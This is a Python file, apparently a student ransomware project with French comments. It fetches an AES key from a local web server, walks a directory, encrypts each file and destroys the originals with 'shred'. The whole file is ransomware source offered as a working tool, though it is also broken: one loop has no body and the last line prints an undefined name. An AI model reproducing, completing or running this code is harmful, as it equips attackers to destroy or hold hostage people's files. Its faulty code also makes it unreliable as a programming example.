from Crypto.Cipher import AES
from Crypto import Random
import os
import random
import struct
import requests
import sys
import subprocess

def encryptFile(key, filename, out_filename=None, chunksize=64+1024):

    if not out_filename:
        out_filename = filename + '.enc'

    # iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    iv = Random.new().read(AES.block_size)

    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(filename)

    with open(filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk)%16)

                outfile.write(encryptor.encrypt(chunk))
    
    


def decryptFile(key, filename, out_filename=None, chunksize=24*1024):

    if not out_filename:
        out_filename = filename[:-4]

    with open(filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)


def main(argv):

    #faire une requête get au serveur web pour récupérer la clé AES256
    url = 'http://localhost:8888/key.txt'
    resp = requests.get(url)
    key=resp.text
    key=key.rstrip("\n")
    key= key.encode('utf-8')

    # a changer en /tmp
    baseUrl = '../copie'

    is_decrypt = None

    if len(argv) > 1:
        is_decrypt = True
        key = bytes(argv[1], 'utf-8')


    for root, dirs, files in os.walk(baseUrl, topdown=False):
       for name in files:
            file = os.path.join(root, name)
            print(file)

            # decrypt
            if is_decrypt:
                if file[-4:] == ".enc":
                    print("[*] Decrypting... ")
                    decryptFile(key, file)
                    os.remove(file)
            # encrypt
            else:
                if file[-4:] != ".enc":
                    print("[*] Encrypting... ")
                    encryptFile(key, file)
                    #os.remove(file)
                    res = subprocess.check_output(["shred", "-uvz", file])
                    for line in res.splitlines():
                        # process the output line by line

   
    '''supprime de la variable et donc la référence à la zone mémoire ou est stocké la valeur de la key, il n'y plus de référence à cette valeur.
    Python via l'algo garbage collection détruit cette zone mémoire pour la réalouer à un nouvelle objet.
    La garbage collection a deux façon de fonctionner: comptage de références et générationnel. 
    - Si le nombre de références d'un objet atteint 0, l'algorithme de comptage de références nettoit la zone mémoire de l'objet.
    - Si il y a un cycle, l'algorithme de références est inefficace, c'est l'algorithme générationnel qui nettoie la zone mémoire
    '''
    print(lol)

if __name__ == '__main__':
    main(sys.argv)